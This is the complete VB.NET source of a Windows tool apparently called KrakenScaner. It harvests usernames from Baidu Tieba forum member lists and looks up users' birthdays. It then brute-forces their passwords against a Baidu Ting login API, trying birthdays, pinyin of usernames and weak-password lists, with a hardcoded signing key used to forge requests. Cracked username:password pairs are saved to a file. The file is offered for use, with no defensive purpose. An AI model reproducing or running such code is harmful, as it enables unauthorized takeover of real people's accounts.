﻿Imports System.Net
Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports KrakenScaner.MyFunctions
Imports Microsoft.International.Converters.PinYinConverter
Imports System.Collections.ObjectModel
Imports SkinSharp

Public Class Form1

    Private Skin As SkinH_Net
    Private NdStop As Boolean
    Private Kw_GBK As String
    Private StartPage As Integer
    Private EndPage As Integer
    Private Delay As Integer
    Private TrNum As Integer
    Private IDList(-1) As String
    Private IDUbd As Integer = -1
    Private CheckBirth As Boolean
    Private CheckPinYin As Boolean
    Private CheckWeak As Boolean
    Private NdLv3 As Boolean
    Private NdTest As Boolean
    Private WeakPW(-1) As String
    Private WeakUbd As Integer = -1
    Private Way As Integer = 0
    Private EndCount As Integer
    Private SucSW As StreamWriter

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        NotifyIcon1.ShowBalloonTip(1000)
    End Sub

    Public Sub New()

        ' 此调用是设计器所必需的。
        InitializeComponent()

        ' 在 InitializeComponent() 调用之后添加任何初始化。
        ModeComboBox.SelectedIndex = 0
        WayComboBox.SelectedIndex = 0
        NotifyIcon1.Icon = Me.Icon

        Skin = New SkinH_Net
        Skin.AttachRes(My.Resources.Aero, My.Resources.Aero.Length, "", 0, 0, 0)
        Skin.SetAero(True)
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub

    Private Sub ModeComboBox_SelectionChangeCommitted(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ModeComboBox.SelectionChangeCommitted
        If ModeComboBox.SelectedIndex = 0 Then '自动
            TBTextBox.Enabled = True
            StartNumeric.Enabled = True
            IDTextBox.Enabled = False
        Else '手动
            TBTextBox.Enabled = False
            StartNumeric.Enabled = False
            IDTextBox.Enabled = True
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("http://www.yy.com/go.html#653238")
    End Sub

    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("http://sighttp.qq.com/msgrd?v=3&uin=562826179&site=%c8%d9%c8%d9%c8%ed%bc%fe&menu=yes")
    End Sub

    Private Sub LinkLabel3_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Process.Start("http://www.258ch.com/forum-48-1.html")
    End Sub

    Private Sub StartButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartButton.Click
        Try
            StartButton.Enabled = False
            '初始化
            TrNum = TrNumeric.Value
            Delay = DelayNumeric.Value
            CheckBirth = BirthCheckBox.Checked
            CheckPinYin = PinYinCheckBox.Checked
            CheckWeak = WeakPWCheckBox.Checked
            NdLv3 = Lv3CheckBox.Checked
            NdTest = PrisonCheckBox.Checked
            EndCount = TrNum
            Way = WayComboBox.SelectedIndex
            NdStop = False
            WeakPW = Split(WeakPWTextBox.Text, vbCrLf)
            WeakUbd = WeakPW.Length - 1
            If WeakPW(WeakUbd) = "" Then WeakUbd -= 1

            If ModeComboBox.SelectedIndex = 0 Then ' 自动
                Dim tbname As String = TBTextBox.Text
                If tbname = "" Then Throw New Exception("请填写贴吧！")
                Kw_GBK = URLEncoGBK(tbname)
                StartPage = StartNumeric.Value
                
                '获取贴吧会员总页数
                Dim wc As New WizardHTTP
                wc.SetDefaultHeader()
                Dim retstr As String = wc.DownloadString("http://tieba.baidu.com/f/like/manage/list?kw=" + Kw_GBK)
                Dim left As Integer = retstr.IndexOf("下一页")
                If left = -1 Then
                    EndPage = 1
                Else
                    left = retstr.IndexOf("pn=", left) + 3
                    Dim right As Integer = retstr.IndexOf("""", left)
                    EndPage = Convert.ToInt32(retstr.Substring(left, right - left))
                End If
                If StartPage > EndPage Then
                    StartPage = 1
                End If
                '打开文件
                SucSW = New StreamWriter(Directory.GetCurrentDirectory + "\" + tbname + ".txt", True, Encoding.Default)
                SucSW.AutoFlush = True
                '启动线程
                For i As Integer = 0 To TrNum - 1
                    Dim tr As New Thread(AddressOf TBScan)
                    tr.Start(i)
                Next

            Else  '手动
                IDList = Split(IDTextBox.Text, vbCrLf)
                IDUbd = IDList.Length - 1
                If IDList(IDUbd) = "" Then IDUbd -= 1
                If IDUbd = -1 Then Throw New Exception("请填写待扫描ID！")
                '打开文件
                SucSW = New StreamWriter(Directory.GetCurrentDirectory + "\成功区.txt", True, Encoding.Default)
                SucSW.AutoFlush = True
                '启动线程
                For i As Integer = 0 To TrNum - 1
                    Dim tr As New Thread(AddressOf ListScan)
                    tr.Start(i)
                Next
            End If
            NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "任务开始...", ToolTipIcon.Info)
            StopButton.Enabled = True

        Catch ex As Exception
            Console.ForegroundColor = ConsoleColor.Red
            Console.WriteLine(Time() + ex.Message)
            StartButton.Enabled = True
        End Try
    End Sub

    Private Sub TBScan(ByVal para As Integer) 'MultiTr

        For i As Integer = StartPage + para To EndPage Step TrNum
            Try
                If NdStop Then Exit For
                '----------------------取会员---------------------------
                StartNumeric.Value = i
                Dim wc As New WizardHTTP
                wc.SetDefaultHeader()
                Dim retstr As String = wc.DownloadString("http://tieba.baidu.com/f/like/manage/list?kw=" + Kw_GBK + "&pn=" + i.ToString())
                ' 超级截取
                Dim sublist As New List(Of String)
                Dim left As Integer = retstr.IndexOf("member_list")
                Dim right As Integer = 0
                Dim cutdown As Integer = retstr.IndexOf("j_pagebar")
                If left = -1 Or cutdown = -1 Then
                    Console.ForegroundColor = ConsoleColor.Red
                    Console.WriteLine(Time() + "第{0}页读取失败！", i)
                    Continue For
                End If
                retstr = retstr.Substring(left, cutdown - left)
                left = 0
                While True
                    left = retstr.IndexOf("bg_lv", left) + 5
                    If left = 4 Then Exit While
                    Dim ndvcode As Integer = Convert.ToInt32(retstr.Substring(left, 1))
                    left = retstr.IndexOf("_blank", left) + 8
                    If left = 7 Then Exit While
                    right = retstr.IndexOf("<", left)
                    Dim tmp As String = retstr.Substring(left, right - left)
                    ' 只有只取会员且等级小于三的情况不加入 那么加入的情况：取反（只取会员 = 真 且 免码 = 1）即 (只取会员 ＝ 假 或 免码 ＝ 2)
                    If Not NdLv3 Or ndvcode = 2 Then
                        sublist.Add(tmp)
                    End If
                    left = right + 1
                End While
                Dim sublistubd As Integer = sublist.Count - 1
                Console.ForegroundColor = ConsoleColor.Yellow
                Console.WriteLine(Time() + "第{0}页会员获取完毕！", i)
                '-----------------------扫号----------------------------
                For j As Integer = 0 To sublistubd
                    Try
                        If NdStop Then Exit For
                        Dim id As String = sublist(j)
                        '生日
                        If CheckBirth Then
                            Dim birthday As String = GetBirthday(id)
                            If birthday <> "" Then
                                If IDTest(id, birthday) Then Exit For
                                Thread.Sleep(Delay)
                                birthday = birthday.Substring(2)
                                If IDTest(id, birthday) Then Exit For
                                Thread.Sleep(Delay)
                            End If
                        End If
                        '拼音
                        If CheckPinYin Then
                            Dim pinyin As String = GetWholePinYin(id)
                            If IDTest(id, pinyin) Then Continue For '大写
                            Thread.Sleep(Delay)
                            If IDTest(id, pinyin.ToLower()) Then Continue For '小写
                            Thread.Sleep(Delay)
                        End If
                        '弱密码
                        If CheckWeak Then
                            For k As Integer = 0 To WeakUbd
                                If IDTest(id, WeakPW(k)) Then Exit For
                                Thread.Sleep(Delay)
                            Next
                        End If
                    Catch ex As Exception
                        Console.ForegroundColor = ConsoleColor.Red
                        Console.WriteLine(Time() + ex.Message)
                    End Try
                Next
            Catch ex As Exception
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine(Time() + ex.Message)
            End Try
        Next

        EndCount -= 1
        If EndCount = 0 Then
            Console.ForegroundColor = ConsoleColor.Green
            Console.WriteLine(Time() + "任务完成，请及时备份成功区！")
            NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "任务完成！", ToolTipIcon.Info)
            SucSW.Close()
            StartButton.Enabled = True
            StopButton.Enabled = False
        End If
    End Sub

    Private Sub ListScan(ByVal para As Integer) 'MultiTr

        For i As Integer = para To IDUbd Step TrNum

            Try
                If NdStop Then Exit For
                '生日
                If CheckBirth Then
                    Dim birthday As String = GetBirthday(IDList(i))
                    If birthday <> "" Then
                        If IDTest(IDList(i), birthday) Then Exit For
                        Thread.Sleep(Delay)
                        birthday = birthday.Substring(2)
                        If IDTest(IDList(i), birthday) Then Exit For
                        Thread.Sleep(Delay)
                    End If
                End If
                '拼音
                If CheckPinYin Then
                    Dim pinyin As String = GetWholePinYin(IDList(i))
                    If IDTest(IDList(i), pinyin) Then Exit For '大写
                    Thread.Sleep(Delay)
                    If IDTest(IDList(i), pinyin.ToLower()) Then Exit For '小写
                    Thread.Sleep(Delay)
                End If
                '弱密码
                If CheckWeak Then
                    For j As Integer = 0 To WeakUbd
                        If IDTest(IDList(i), WeakPW(j)) Then Exit For
                        Thread.Sleep(Delay)
                    Next
                End If

            Catch ex As Exception
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine(Time() + ex.Message)
            End Try
        Next

        EndCount -= 1
        If EndCount = 0 Then
            Console.ForegroundColor = ConsoleColor.Green
            Console.WriteLine(Time() + "任务完成，请及时备份成功区！")
            NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "任务完成！", ToolTipIcon.Info)
            SucSW.Close()
            StartButton.Enabled = True
            StopButton.Enabled = False
        End If
    End Sub

    Private Function IDTest(ByVal id As String, ByVal pw As String) As Boolean

        Try
            Dim status As Integer = 0 '0:succeed 1:failed 2:hit-stategy
            Dim msg As String = ""

            Dim poststr As String = "appid=1&cert_id=&clientid=000000000000000&clientip=&crypttype=1&ie=gbk&isphone=0&logictype=1&login_type=3&password=" + ToBase64(pw) + "&tpl=ting&username=" + id + "&vcodestr=&verifycode="
            Dim sign As String = MD5Encrypt(poststr + "&sign_key=b6834583e7ca6f5959b29bb9d163c9cf", Encoding.Default).ToLower()
            poststr = "appid=1&cert_id=&clientid=000000000000000&clientip=&crypttype=1&ie=gbk&isphone=0&logictype=1&login_type=3&password=" + ToBase64(pw) + "&tpl=ting&username=" + URLEncoGBK(id) + "&vcodestr=&verifycode=" + "&sig=" + sign + "&from=android&version=2.3.0"
            Dim wc As New WizardHTTP
            wc.SetDefaultHeaderAdr()
            Dim retstr As String = wc.UploadString("http://tingapi.ting.baidu.com/v1/restserver/ting?from=android&version=2.3.0&method=baidu.ting.user.nplogin&format=json", poststr)
            Dim left As Integer = retstr.IndexOf("errno"":") + 7
            Dim right As Integer = retstr.IndexOf("}", left)
            Dim errno As String = retstr.Substring(left, right - left)
            If errno = "0" Then
                status = 0
            Else
                status = 1
                msg = TingGetErrmsg(Convert.ToInt32(errno))
            End If

            If status = 0 Then 'succeed
                Console.ForegroundColor = ConsoleColor.Green
                Console.WriteLine(Time() + id + " " + pw + " 扫描成功！")
                SucTextBox.AppendText(id + ":" + pw + vbCrLf)
                NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, id + " 扫描成功！", ToolTipIcon.Info)
                SucSW.WriteLine(id + ":" + pw)
                If NdTest Then TestPrison(id)
                Return True
            Else 'failed
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine(Time() + id + " " + pw + " 扫描失败！" + msg)
                Return False
            End If

        Catch ex As Exception
            Console.ForegroundColor = ConsoleColor.Red
            Console.WriteLine(Time() + ex.Message)
            Return False
        End Try
    End Function

    Private Sub TestPrison(ByVal id As String)
        Dim wc As New WizardHTTP
        wc.SetDefaultHeader()
        Dim retstr As String = wc.DownloadString("http://tieba.baidu.com/i/sys/user_json?un=" + URLEncoGBK(id))
        Dim left As Integer = retstr.IndexOf("is_prison") + 11
        Dim right As Integer = retstr.IndexOf(",", left)
        Dim prison As String = retstr.Substring(left, right - left)
        If prison = "true" Then
            NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, id + " 被封禁。", ToolTipIcon.Info)
        Else
            NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, id + " 没有被封禁。", ToolTipIcon.Info)
        End If
    End Sub

    Private Sub StopButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopButton.Click
        NdStop = True
        Console.ForegroundColor = ConsoleColor.Yellow
        Console.WriteLine(Time() + "用户停止任务，请等待当前线程结束！")
    End Sub

    Private Function GetWholePinYin(ByVal str As String) As String '大写
        Dim sb As New StringBuilder()
        For i As Integer = 0 To str.Length - 1
            If AscW(str(i)) < 128 Then
                sb.Append(str(i))
            ElseIf ChineseChar.IsValidChar(str(i)) Then
                Dim cc As New ChineseChar(str(i))
                Dim apinyin As String = cc.Pinyins(0)
                apinyin = apinyin.Substring(0, apinyin.Length - 1)
                sb.Append(apinyin)
            End If
        Next
        Return sb.ToString()
    End Function

    Private Function GetBirthday(ByVal id As String) As String '空串表示失败
        Dim wc As New WizardHTTP
        wc.SetDefaultHeader()
        Dim retstr As String = wc.DownloadString("http://passport.baidu.com/?business&aid=6&un=" + URLEncoGBK(id))
        Dim re As New Regex("[0-9]{1,4}年[0-9]{1,2}月[0-9]{1,2}日")
        Dim rm As Match = re.Match(retstr)
        If rm.Success Then
            Dim birthday As String = rm.Value
            Left = birthday.IndexOf("年")
            Left += 1
            Dim yy As String = birthday.Substring(0, Left)
            Dim Right As Integer = birthday.IndexOf("月", Left)
            Dim mm As String = birthday.Substring(Left, Right - Left)
            Right += 1
            Left = birthday.Length - 1
            Dim dd As String = birthday.Substring(Right, Left - Right)
            If mm.Length = 1 Then mm = "0" + mm
            If dd.Length = 1 Then dd = "0" + dd
            Return yy + mm + dd
        Else
            Return ""
        End If
    End Function

    Private Sub NotifyIcon1_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Me.Visible = Not Me.Visible
    End Sub

    Private Sub LinkLabel4_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel4.LinkClicked
        If SucTextBox.Text <> "" Then
            Clipboard.SetText(SucTextBox.Text)
            NotifyIcon1.ShowBalloonTip(1000, NotifyIcon1.BalloonTipTitle, "复制成功！", ToolTipIcon.Info)
        End If
    End Sub

    Private Function TingGetErrmsg(ByVal errno As Integer) As String
        Select Case errno
            Case 1
                Return "用户名格式错误"
            Case 2
                Return "用户不存在"
            Case 4
                Return "登录密码错误"
            Case 6
                Return "验证码不匹配，请重新输入验证码"
            Case 16
                Return "对不起，您现在无法登陆"
            Case 257
                Return "请输入验证码"
            Case 110024
                Return "请激活帐号"
            Case -1
                Return "接口参数错误"
            Case -2
                Return "签名错误"
            Case -3
                Return "未找到的tpl+appid组合"
            Case -4
                Return "访问方IP未授权"
            Case -5
                Return "证书已失效"
            Case -6
                Return "指定的cert_id不存在"
            Case Else
                Return "错误代码：" + errno.ToString()
        End Select
    End Function
End Class